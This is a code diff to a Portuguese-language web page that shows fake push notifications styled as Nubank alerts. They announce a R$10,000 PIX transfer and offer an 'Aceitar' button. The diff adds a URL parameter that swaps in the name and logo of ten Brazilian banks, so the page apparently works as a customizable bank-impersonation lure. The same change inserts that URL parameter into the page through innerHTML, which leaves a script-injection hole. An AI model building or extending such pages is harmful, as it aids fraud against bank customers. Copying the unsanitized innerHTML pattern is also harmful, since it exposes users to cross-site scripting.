@@ -398,18 +398,18 @@
             <div class="flex-grow pr-2">
                 <div class="flex items-center mb-1">
                     <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
-                        <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Nubank logo" class="w-full h-full object-cover">
+                        <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
                     </div>
-                    <span class="text-gray-700 text-sm">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                    <span class="text-gray-700 text-sm" id="bankName1">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
                 </div>
                 <div class="text-black text-lg font-bold mb-0">PIX no valor de R$10.000,00</div>
             </div>
             <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
-                <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Nubank logo" class="w-full h-full object-cover">
+                <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
             </div>
         </div>
         <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
-            CAIXA ECONÔMICA FEDERAL deseja transferir R$10.000,00 para sua conta Nubank. Você deseja aceitar?
+            CAIXA ECONÔMICA FEDERAL deseja transferir R$10.000,00 para sua conta <span id="bankText1">Nubank</span>. Você deseja aceitar?
         </div>
         <div class="flex justify-end mt-3 space-x-2" style="margin-right: 5px;">
             <button id="acceptButton" class="bg-green-500 text-white text-sm px-6 py-2 rounded-lg hover:bg-green-600 transition duration-200 button-text-shadow button-shadow flex-grow">Aceitar</button>
@@ -423,9 +423,9 @@
             <div class="flex-grow pr-2">
                 <div class="flex items-center mb-1">
                     <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
-                        <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Nubank logo" class="w-full h-full object-cover">
+                        <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
                     </div>
-                    <span class="text-gray-700 text-sm">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
+                    <span class="text-gray-700 text-sm" id="bankName2">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
                 </div>
                 <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis;">
                     <span class="mr-2" style="font-size: 1.1em;">🚨</span>
@@ -433,7 +433,7 @@
                 </div>
             </div>
             <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
-                <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Nubank logo" class="w-full h-full object-cover">
+                <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
             </div>
         </div>
         <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
@@ -598,6 +598,45 @@
         }
 
         setTimeout(vibrateDevice, 500);
+
+        // Função para obter a imagem do banco baseada no parâmetro 'bank' da URL
+        function getBankImage() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const bank = urlParams.get('bank');
+            
+            // Mapeamento de bancos para suas respectivas imagens
+            const bankImages = {
+                'Nubank': 'https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png',
+                'Itau': 'https://upload.wikimedia.org/wikipedia/commons/2/2d/2023_Ita%C3%BA_Unibanco_Logo.png',
+                'Bradesco': 'https://media.licdn.com/dms/image/v2/C4E0BAQEXB9xussWsHQ/company-logo_200_200/company-logo_200_200/0/1680038081184/bradesco_logo?e=2147483647&v=beta&t=g_KrgasAdf1h-qhIvVQG3R5022A7UVAaAnuFYCNBqkc',
+                'Santander': 'https://i.pinimg.com/564x/e9/67/a4/e967a4935c65ed0da069364e952e4630.jpg',
+                'Caixa': 'https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg',
+                'Banco do Brasil': 'https://yt3.googleusercontent.com/YoY6PQUzk6UXJEW8sTYs8zf_TfPLHNLSim65mswp_w5CX0jYgtl_le41QPRwoI1Hyj4OM2q_=s900-c-k-c0x00ffffff-no-rj',
+                'Inter': 'https://i.ibb.co/04MjDYh/Design-sem-nome-5.png',
+                'C6': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAdb6wCFEOzVXR0WHXSOLsjjWTwWL0u1-FTw&s',
+                'PicPay': 'https://yt3.googleusercontent.com/cUdSm0KI0fN0sgr5Jb_DvkaQRuR5G9rl1ijX7MoUueMq2AVzNKdBqS_WNALQl9OTRyCviKFJQOs=s900-c-k-c0x00ffffff-no-rj',
+                'Neon': 'https://t.ctcdn.com.br/j48g27dg8ohgm7yzRap-mQEZkrQ=/i666960.jpeg'
+            };
+            
+            // Retorna a imagem correspondente ao banco ou a imagem padrão do Nubank
+            return bankImages[bank] || bankImages['Nubank'];
+        }
+
+        // Obtém o nome do banco e a imagem
+        const urlParams = new URLSearchParams(window.location.search);
+        const bankName = urlParams.get('bank') || 'Nubank';
+        const bankImage = getBankImage();
+        
+        // Aplica a imagem do banco nas notificações
+        const bankImages = document.querySelectorAll('.bank-image');
+        bankImages.forEach(img => {
+            img.src = bankImage;
+        });
+        
+        // Atualiza o nome do banco nos textos
+        document.getElementById('bankName1').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
+        document.getElementById('bankName2').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
+        document.getElementById('bankText1').textContent = bankName;
 
         const notification1 = document.getElementById('notification1');
         const notification2 = document.getElementById('notification2');
